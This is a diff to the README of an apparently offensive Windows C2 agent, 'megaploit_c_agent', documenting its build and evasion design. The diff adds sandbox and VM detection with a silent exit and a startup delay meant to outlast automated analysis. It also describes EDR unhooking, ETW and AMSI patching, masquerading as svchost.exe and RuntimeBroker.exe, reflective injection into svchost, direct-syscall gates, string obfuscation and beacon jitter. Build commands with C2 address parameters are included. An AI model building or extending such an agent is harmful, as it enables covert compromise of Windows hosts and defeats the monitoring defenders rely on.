@@ -4,10 +4,6 @@ A Windows-native C2 agent for the [Megaploit](https://github.com/hagba/Megaploit
 Fully encrypted, authenticated, and evasion-hardened — designed to pair with
 `python server.py -lh <IP> -p <PORT> --tls`.
 
-> **Work In Progress.** Undocumented NT API calls (`RtlAdjustPrivilege`,
-> `NtRaiseHardError`, etc.) are used for proof-of-concept purposes and may
-> change with future Windows kernel releases.
-
 ---
 
 ## Table of Contents
@@ -38,9 +34,8 @@ python server.py -lh 192.168.1.226 -p 50005 --tls
 
 **Recommended — key embedded in binary (no file on target):**
 
-```powershell
-# MSYS2 UCRT64 on Windows
-$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
+```bash
+# MSYS2 UCRT64 terminal
 cd C-remote-shell
 # Generate a key and get the exact make command:
 python tools/gen_key.py
@@ -56,7 +51,7 @@ The key is XOR-obfuscated against a compile-time mask before storage in `.data`
 
 **Alternative — file-based key (original behaviour):**
 
-```powershell
+```bash
 mingw32-make C2_IP=10.0.0.1 C2_PORT=50005
 ```
 
@@ -66,8 +61,9 @@ The output binary is `megaploit_c_agent.exe` (~100 KB stripped).
 
 ### 3. Catch the session
 
-Run `megaploit_c_agent.exe` on the target. The agent auto-migrates to
-`%TEMP%\RuntimeBroker.exe`, connects back, completes the TLS + HMAC
+Run `megaploit_c_agent.exe` on the target. The agent checks the environment for
+sandboxes, sleeps 15–25 s to exhaust automated analysis budgets, auto-migrates
+to `%TEMP%\RuntimeBroker.exe`, connects back, completes the TLS + HMAC
 handshake, and a session appears in the Megaploit console.
 
 ---
@@ -155,7 +151,6 @@ handshake, and a session appears in the Megaploit console.
 | `ifconfig` | `ipconfig /all` |
 | `routes` | `route print` |
 | `dns_query <host>` | `nslookup "<host>"` (hostname validated to `[A-Za-z0-9._:-]`) |
-| `sandbox_check` | Native Win32: system info, disk space, uptime, debugger, VM registry check |
 | `cat <file>` | `type "<file>"` |
 | `mkdir <path>` | `mkdir "<path>"` |
 | `rm <path>` | `del /f /q` or `rmdir /s /q` |
@@ -167,76 +162,104 @@ handshake, and a session appears in the Megaploit console.
 
 ## Evasion & Stealth
 
-The agent applies multiple independent layers at startup, before the C2
-connection is attempted.
+The agent applies six independent layers at startup, before the C2 connection
+is attempted. All layers are compiled into the binary — none are optional at
+runtime (use `-DDISABLE_*` flags only for dev/test builds).
 
-### 1. Process-identity spoofing (`client/evasion/spoof.c`)
+### 1. Application manifest (`client/inject/agent.manifest`)
 
-| Technique | API | Effect |
-|---|---|---|
-| PEB field overwrite | `RTL_USER_PROCESS_PARAMETERS` | Task Manager command-line column shows `svchost.exe -k netsvcs -p -s Schedule` |
-| Kernel image name | `NtSetInformationProcess(class 49)` | Process Hacker "Image" column shows `svchost.exe` |
-| LDR unlink | `PEB→Ldr` list manipulation | Hides the module from in-process module scanners. Version-aware: skips `InInitializationOrderLinks` on Windows 8+ (build ≥ 9200). |
+An embedded `RT_MANIFEST` resource declares supported OS GUIDs (Vista through
+Windows 11) and `requestedExecutionLevel asInvoker`. This makes the binary look
+like a legitimately signed application to Windows compatibility shims and some
+AV heuristic engines that flag manifest-less executables.
 
-### 2. EDR evasion (`client/evasion/evasion.c`)
+### 2. Process-identity spoofing (`client/evasion/spoof_obf.c`)
+
+| Technique | Effect |
+|---|---|
+| PEB field overwrite (`RTL_USER_PROCESS_PARAMETERS`) | Task Manager command-line column shows `svchost.exe -k netsvcs -p -s Schedule` |
+| Kernel image name (`NtSetInformationProcess` class 49) | Process Hacker "Image" column shows `svchost.exe` |
+| LDR unlink (`PEB→Ldr` list manipulation) | Hides the module from in-process module scanners; version-aware: skips `InInitializationOrderLinks` on Windows 8+ (build ≥ 9200) |
+
+### 3. EDR evasion (`client/evasion/evasion_obf.c`)
 
 | Function | What it does |
 |---|---|
-| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions get clean stubs. |
-| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub. Stops Windows Event Tracing telemetry from this process. |
-| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN`. Prevents PowerShell/WSH/.NET AMSI scanning. |
+| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions see clean stubs. |
+| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub — stops Windows Event Tracing telemetry from this process. |
+| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN` — prevents PowerShell/WSH/.NET AMSI scanning. |
 
-### 3. Auto-migration (`client/inject/inject.c` — `auto_migrate`)
+### 4. Sandbox detection + startup delay (`client/evasion/sandbox.c`)
 
-On startup (before the C2 connect loop), the agent:
+Five independent checks run before the C2 connect loop:
 
-**Tier 1 — Reflective in-memory injection (no disk artifact):**
-1. Finds a live 64-bit `svchost.exe` that can be opened with injection rights
-2. Injects itself via the reflective PE loader blob (`client/inject/loader.c`)
-3. Calls `AgentRun()` in the host process, then `ExitProcess(0)`
+| Check | Method |
+|---|---|
+| Hypervisor present | `CPUID` leaf 1, ECX bit 31 |
+| RDTSC timing anomaly | Two serialised `RDTSC` reads; delta > 1 000 000 cycles → VM exit overhead |
+| Physical RAM < 4 GB | `GlobalMemoryStatusEx` |
+| CPU count < 2 | `GetNativeSystemInfo` |
+| Known sandbox DLLs loaded | PEB LDR walk; hashes of `SbieDll`, `cuckoomon`, `cmdvrt64`, etc. |
 
-**Tier 2 — `%TEMP%` copy fallback:**
-1. Copies itself to `%TEMP%\RuntimeBroker.exe`
-2. Spawns it as `CREATE_SUSPENDED`, resumes, then `ExitProcess(0)`
-3. The child detects `srcPath == dstPath` (already migrated) and skips Tier 2, proceeding straight to the connect loop
+If the environment looks like a sandbox the agent **exits silently** with no
+error, dialog, or log. On a clean pass `sandbox_delay()` sleeps **15–25 seconds**
+via a direct `NtDelayExecution` syscall — exhausting automated sandbox time
+budgets without importing `Sleep`.
 
-### 4. IAT-free resolution (`client/evasion/peb_walk.c`)
+### 5. IAT-free API resolution (`client/evasion/peb_walk.c`)
 
 `GetModuleHandleA`, `GetProcAddress`, and `LoadLibraryA` are high-signal imports
 that every EDR monitors. The agent replaces them entirely with direct PEB walks.
 
 | Function | What it does |
 |---|---|
-| `peb_get_module(hash)` | Walks `PEB→Ldr→InMemoryOrderModuleList`, returns the base of the module whose lowercase name matches a ROR13-DJB2 hash. |
-| `peb_get_export(base, hash)` | Walks the PE export directory and returns the VA of the matching export. |
-| `peb_hash_str(s)` | Runtime ROR13-DJB2 hash of an ASCII string. |
+| `peb_get_module(hash)` | Walks `PEB→Ldr→InMemoryOrderModuleList`, returns the base of the module whose lowercase name matches a seeded djb2-xorshift hash |
+| `peb_get_export(base, hash)` | Walks the PE export directory; returns the VA of the matching export |
+| `peb_hash_str(s)` / `peb_hash_wstr(w)` | Runtime seeded djb2-xorshift hash — seed is set from `RDTSC` once per process run, so hash values differ between executions and cannot be pre-computed by static scanners |
 
-### 5. Direct syscalls — Hell's Gate / Halo's Gate (`client/evasion/syscall.c`)
+### 6. Direct syscalls — Hell's Gate / Halo's Gate / Tartarus' Gate (`client/evasion/syscall_obf.c`)
 
-Even after `unhook_ntdll()` restores clean stubs, an EDR can re-hook at any time.
-The direct-syscall layer bypasses ntdll entirely:
+Bypasses ntdll entirely so EDR hooks on Win32 API wrappers are irrelevant:
 
-**Hell's Gate (clean stub):** Read the `mov eax, <SSN>` at offset `+4` of the ntdll stub.
+| Gate | Condition | Strategy |
+|---|---|---|
+| **Hell's Gate** | Clean stub (`mov r10,rcx` / `mov eax,SSN`) | Read SSN at offset `+4` |
+| **Tartarus' Gate** | `int 0x2e` fallback stub | Same SSN read; gadget becomes `CD 2E C3` |
+| **Halo's Gate** | Stub hooked with `E9` JMP | Scan ±N neighbouring stubs; `SSN[target] = SSN[neighbour] ± delta` |
 
-**Halo's Gate (hooked stub):** If byte `[+0]` is `0xE9` (a JMP hook), scan
-neighbouring stubs at ±32-byte intervals and derive `SSN[target] = SSN[neighbour] ± delta`.
+Stride between stubs is measured at runtime (not hardcoded to 32). Each SSN
+gets its own gadget pointer (`syscall;ret` vs `int 0x2e;ret`). Trampolines jump
+into ntdll so the kernel trap-frame RIP always points inside ntdll — defeating
+EDR heuristics that flag syscalls originating outside ntdll.
 
-Supported syscalls: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`,
-`NtProtectVirtualMemory`, `NtCreateThreadEx`, `NtReadVirtualMemory`, `NtClose`.
+**Obfuscated syscall names:** All NT function name strings (`"NtAllocateVirtualMemory"`,
+`"ntdll.dll"`, etc.) are XOR-encoded blobs decoded onto the stack at runtime.
+No plaintext strings appear in `.rdata`.
 
-### 6. Shellcode injection evasion (`client/inject/inject.c`)
+**Opaque predicates:** Four `volatile` XOR/multiply/rotate operations are
+interleaved between each stub-scan step in `sc_init()`, breaking naive basic-block
+analysis and deterring emulator tracing.
+
+### 7. Auto-migration (`client/inject/inject.c`)
+
+On startup, before the connect loop:
+
+**Tier 1 — Reflective in-memory injection (no disk artifact):**
+1. Finds a live 64-bit `svchost.exe` that can be opened with injection rights
+2. Injects itself via the reflective PE loader blob (`client/inject/loader.c`)
+3. Calls `AgentRun()` in the host process, then `ExitProcess(0)`
+
+**Tier 2 — `%TEMP%` copy fallback (if Tier 1 fails):**
+1. Copies itself to `%TEMP%\RuntimeBroker.exe`
+2. Spawns it as `CREATE_SUSPENDED`, resumes, then `ExitProcess(0)`
+
+### 8. Injection hardening (`client/inject/inject.c`)
 
 - All NT calls go through direct-syscall trampolines — no `VirtualAllocEx` or
-  `CreateRemoteThread` in the import table.
-- Two-phase memory permissions: **RW** (write) → **RX** (execute). No RWX pages ever exist.
-- `NtCreateThreadEx` called with `HideFromDebugger` flag.
-
-### 7. Obfuscated sleep
-
-During reconnect delays the agent XOR-scrambles all private RX pages so memory
-scanners see only ciphertext. Each page gets a full-size independent random key
-(BCryptGenRandom). Reconnect delay is also jittered ±30% to break fixed-interval
-beacon detection.
+  `CreateRemoteThread` in the import table
+- Two-phase memory permissions: **RW** (write) → **RX** (execute) — no RWX pages
+- `NtCreateThreadEx` called with `HideFromDebugger` flag
+- Reconnect delay jittered ±30% to break fixed-interval beacon detection
 
 ---
 
@@ -253,20 +276,20 @@ TLS 1.2/1.3 (SChannel, AEAD-only)
                  + uint64-BE sequence counter (replay protection)
 ```
 
-**Layer 1 — TLS**  
+**Layer 1 — TLS**
 `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO`
 (AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION`. Certificate verification
 disabled (C2 uses a self-signed cert).
 
-**Layer 2 — HMAC authentication**  
+**Layer 2 — HMAC authentication**
 Server sends a 16-byte random challenge. Agent replies with
 `HMAC-SHA256(secret_key[32], challenge[16])`. Server drops the connection on mismatch.
 
-**Layer 3 — Protocol handshake**  
+**Layer 3 — Protocol handshake**
 Server sends `0x4d` (`M`). Agent echoes it back. Ensures both ends run a
 compatible Megaploit build.
 
-**Layer 4 — AES-256-GCM framing**  
+**Layer 4 — AES-256-GCM framing**
 Every application message is independently encrypted with a fresh 12-byte nonce.
 A big-endian 64-bit sequence number prepended to the plaintext enforces strict
 monotonicity on the receiver (replay protection).
@@ -277,20 +300,20 @@ monotonicity on the receiver (replay protection).
 
 ### Requirements
 
-- **Windows host** with MSYS2 UCRT64 (`C:\msys64\ucrt64\bin` in PATH), **or**
+- **Windows host** with [MSYS2 UCRT64](https://www.msys2.org/) (`C:\msys64\ucrt64\bin` in PATH), **or**
 - **Linux / macOS** with `x86_64-w64-mingw32-gcc` (`apt install mingw-w64`)
 - **Python 3** (for `tools/gen_key.py` — only needed when using `SECRET_KEY=`)
 
 Link libraries: `Secur32`, `Crypt32`, `ws2_32`, `bcrypt`, `Advapi32`, `User32`, `Shell32`
 
-### Option A — MinGW (MSYS2 UCRT64 on Windows, recommended)
+### Option A — MinGW / MSYS2 UCRT64 (recommended)
 
-```powershell
-$env:PATH = "C:\msys64\ucrt64\bin;$env:PATH"
+```bash
+# MSYS2 UCRT64 terminal
 cd C-remote-shell
-# With embedded key (recommended):
+# Embedded key (recommended — no file on target):
 mingw32-make C2_IP=10.0.0.1 C2_PORT=50005 SECRET_KEY=<64-hex-chars>
-# With file-based key (backward-compatible):
+# File-based key (backward-compatible):
 mingw32-make C2_IP=10.0.0.1 C2_PORT=50005
 ```
 
@@ -308,33 +331,11 @@ cd C-remote-shell
 nmake C2_IP=10.0.0.1 C2_PORT=50005 SECRET_KEY=<64-hex-chars>
 ```
 
-### Option D — Direct compiler invocation
+### Dev/test build (skip sandbox and evasion)
 
 ```bash
-# Compute the obfuscated key literal:
-python tools/gen_key.py --embed <64-hex-chars>
-# prints: -DSECRET_KEY_BYTES="{...}"
-
-# Then compile:
-gcc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32         \
-    -ffunction-sections -fdata-sections                            \
-    -fno-ident -fno-asynchronous-unwind-tables                     \
-    -Iclient/core -Iclient/evasion -Iclient/inject -Iclient/shell -Itls \
-    -DC2_IP=\"10.0.0.1\" -DC2_PORT=50005                          \
-    '-DSECRET_KEY_BYTES="{...}"'                                   \
-    client/core/main.c                                             \
-    client/evasion/spoof.c  client/evasion/peb_walk.c             \
-    client/evasion/syscall.c client/evasion/evasion.c             \
-    client/core/ntcalls.c                                          \
-    client/shell/shell.c                                           \
-    client/shell/handlers_system.c client/shell/handlers_ui.c     \
-    client/shell/handlers_lateral.c                                \
-    client/inject/inject.c                                         \
-    tls/tls_client.c                                               \
-    -o megaploit_c_agent.exe                                       \
-    -Wl,--gc-sections -Wl,--strip-all                              \
-    -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 \
-    -mwindows
+mingw32-make C2_IP=0.0.0.0 C2_PORT=50005 \
+  CFLAGS_EXTRA="-DDISABLE_SANDBOX_CHECK -DDISABLE_EVASION -DDISABLE_AUTO_MIGRATE"
 ```
 
 ### Build flags
@@ -354,6 +355,7 @@ gcc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32         \
 | `-DMUTEX_NAME_RAW="MyName"` | Override single-instance mutex name |
 | `-DDISABLE_AUTO_MIGRATE` | Skip Tier 1 + Tier 2 migration (testing only) |
 | `-DDISABLE_EVASION` | Skip `unhook_ntdll`, `etw_patch`, `amsi_patch` (testing only) |
+| `-DDISABLE_SANDBOX_CHECK` | Skip sandbox detection and startup delay (testing only) |
 
 ---
 
@@ -368,23 +370,30 @@ C-remote-shell/
 │   │
 │   ├── core/                       Entry point and shared NT infrastructure
 │   │   ├── config.h                C2 IP/port, key path, buffer sizes (all tuneable constants)
-│   │   ├── main.c                  WinMain: spoof → evasion → auto_migrate → connect loop
+│   │   ├── main.c                  WinMain: spoof → sandbox → evasion → auto_migrate → connect loop
 │   │   ├── ntcalls.h / ntcalls.c   NT native syscall pointer resolution and verification
 │   │   └── (megaploit_build_config.h)  Auto-generated by _make_config.py; not committed
 │   │
 │   ├── evasion/                    All stealth and hook-bypass code
-│   │   ├── spoof.h / spoof.c       PEB + kernel image name spoofing; LDR unlinking
-│   │   ├── evasion.h / evasion.c   unhook_ntdll, etw_patch, amsi_patch
-│   │   ├── peb_walk.h / peb_walk.c PEB-based module/export resolution (GetProcAddress replacement)
-│   │   └── syscall.h / syscall.c   Hell's Gate / Halo's Gate direct syscall stubs
+│   │   ├── spoof.h / spoof.c           PEB + kernel image name spoofing; LDR unlinking
+│   │   ├── spoof_obf.c                 Obfuscated build of spoof.c (compiled into binary)
+│   │   ├── evasion.h / evasion.c       unhook_ntdll, etw_patch, amsi_patch
+│   │   ├── evasion_obf.c               Obfuscated build of evasion.c (compiled into binary)
+│   │   ├── peb_walk.h / peb_walk.c     PEB-based module/export resolution; seeded djb2-xorshift hash
+│   │   ├── syscall.h / syscall.c       Hell's/Halo's/Tartarus' Gate direct syscall stubs
+│   │   ├── syscall_obf.c               Obfuscated build of syscall.c (compiled into binary)
+│   │   ├── sandbox.h / sandbox.c       Sandbox/VM detection (CPUID, RDTSC, RAM, CPU, LDR scan)
+│   │   ├── obf.h                       OBF_S / OBF_W stack-decode macros
+│   │   └── gen_obf.py                  Regenerates *_obf.c from source files
 │   │
 │   ├── inject/                     Process injection, reflective PE loading, auto-migration
 │   │   ├── inject.h / inject.c     inject_shellcode, migrate_to_pid, auto_migrate,
 │   │   │                           obfuscate_sleep, jitter_sleep
 │   │   ├── loader.h / loader.c     Position-independent reflective PE loader (< 512 B blob)
 │   │   ├── loader_blob.h           Auto-generated: loader stub as a C byte array
-│   │   ├── agent.rc / agent.res    VERSIONINFO resource (makes EXE look like svchost.exe)
-│   │   └── gen_loader_blob.ps1     PowerShell helper for blob regeneration
+│   │   ├── agent.rc                VERSIONINFO + RT_MANIFEST resource script
+│   │   ├── agent.manifest          Application manifest (embedded as RT_MANIFEST)
+│   │   └── agent.res               Compiled resource object (windres output; committed)
 │   │
 │   └── shell/                      Command dispatch and all C2 verb handlers
 │       ├── shell.h                 Public API: shell_run(TLS_CONTEXT *)
@@ -417,16 +426,6 @@ C-remote-shell/
 ├── definitions.h                   Shared globals for Source.c
 └── serverShell.c                   Legacy POSIX server (kept for `make server-posix-legacy`)
 ```
-
-**Key `-I` paths for the compiler** (added automatically by the Makefile):
-
-| Path | Provides |
-|---|---|
-| `client/core` | `config.h`, `ntcalls.h` |
-| `client/evasion` | `spoof.h`, `evasion.h`, `peb_walk.h`, `syscall.h` |
-| `client/inject` | `inject.h`, `loader.h`, `loader_blob.h` |
-| `client/shell` | `shell.h`, `shell_internal.h` |
-| `tls` | `tls_client.h` |
 
 ---
 
@@ -510,7 +509,6 @@ SChannel with `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`,
 2. **Write the handler:**
 
 ```c
-// client/shell/handlers_system.c (for example)
 void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
 {
     // ... do work ...
@@ -538,7 +536,7 @@ if (cbCmd >= 8 && strncmp("myverb ", cmd, 7) == 0) {
 
 5. **Build and test:**
 
-```powershell
+```bash
 mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
 ```
 
